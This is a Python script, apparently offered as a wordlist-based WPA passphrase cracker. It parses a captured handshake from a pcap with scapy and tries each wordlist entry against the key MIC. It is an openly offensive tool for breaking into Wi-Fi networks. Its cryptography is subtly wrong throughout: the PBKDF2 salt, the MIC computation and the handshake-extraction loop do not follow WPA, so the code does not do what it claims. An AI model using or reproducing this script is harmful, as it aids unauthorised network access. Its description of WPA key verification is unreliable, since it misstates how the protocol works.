import hashlib
import hmac
from scapy.all import rdpcap, EAPOL, Dot11, Dot11Beacon
import binascii
import argparse

def extract_wpa_details(packet):
    """Extract EAPOL details (Key Nonce, MIC, MAC addresses)"""
    if packet.haslayer(EAPOL):
        eapol = packet[EAPOL]
        if eapol.type == 3:  # EAPOL-Key frame
            key_mic = eapol.key_mic
            key_nonce = eapol.key_nonce
            ap_mac = packet[Dot11].addr2
            client_mac = packet[Dot11].addr1
            return ap_mac, client_mac, key_nonce, key_mic
    return None, None, None, None

def extract_ssid(packet):
    """Extract SSID from beacon frames"""
    if packet.haslayer(Dot11Beacon):
        ssid = packet.info.decode()
        return ssid
    return None

def pbkdf2(password, ssid, ap_mac, client_mac, key_nonce, iterations=4096):
    """Derive the PMK (Pairwise Master Key) using PBKDF2-HMAC-SHA1"""
    # Prepare the PSK (password) and concatenate the MAC addresses
    pmk_input = ap_mac + client_mac
    password = password.encode()  # Password from wordlist

    # PBKDF2-HMAC-SHA1 key derivation
    derived_key = hashlib.pbkdf2_hmac("sha1", password, key_nonce + pmk_input.encode(), iterations, dklen=32)
    return derived_key

def verify_mic(candidate_key, eapol_key_mic, ap_mac, client_mac, ssid):
    """Verify the MIC (Message Integrity Code) from the derived key"""
    # Perform HMAC to verify the MIC
    hmac_result = hmac.new(candidate_key, ssid.encode(), hashlib.sha1)
    if hmac_result.digest() == eapol_key_mic:
        return True
    return False

def crack_wpa(pcap_file, wordlist_file):
    """Perform WPA passphrase cracking using a wordlist"""
    packets = rdpcap(pcap_file)
    
    # Extract WPA handshake details from pcap
    ap_mac, client_mac, key_nonce, eapol_key_mic = None, None, None, None
    ssid = None

    for pkt in packets:
        ssid = extract_ssid(pkt)
        if ssid:
            break

        ap_mac, client_mac, key_nonce, eapol_key_mic = extract_wpa_details(pkt)
        if ap_mac and client_mac and key_nonce and eapol_key_mic:
            break

    if not ap_mac or not client_mac or not key_nonce or not eapol_key_mic:
        print("Unable to extract WPA handshake.")
        return
    
    print(f"Attempting to crack WPA passphrase for SSID: {ssid}")
    print(f"AP MAC: {ap_mac}")
    print(f"Client MAC: {client_mac}")

    # Iterate through the wordlist and attempt to crack the password
    with open(wordlist_file, "r") as wordlist:
        for password in wordlist:
            password = password.strip()  # Remove trailing spaces/newlines
            print(f"Trying password: {password}")

            # Derive the PMK (Pairwise Master Key)
            candidate_key = pbkdf2(password, ssid, ap_mac, client_mac, key_nonce)

            # Verify if the derived key matches the EAPOL MIC
            if verify_mic(candidate_key, eapol_key_mic, ap_mac, client_mac, ssid):
                print(f"Password found: {password}")
                return

    print("Password not found in the wordlist.")

def main():
    """Main function to start the WPA cracking process"""
    parser = argparse.ArgumentParser(description="WPA Passphrase Cracker using a wordlist.")
    parser.add_argument("pcap_file", help="Path to the pcap file containing the WPA handshake.")
    parser.add_argument("wordlist_file", help="Path to the wordlist file for password cracking.")

    args = parser.parse_args()

    crack_wpa(args.pcap_file, args.wordlist_file)

if __name__ == "__main__":
    main()
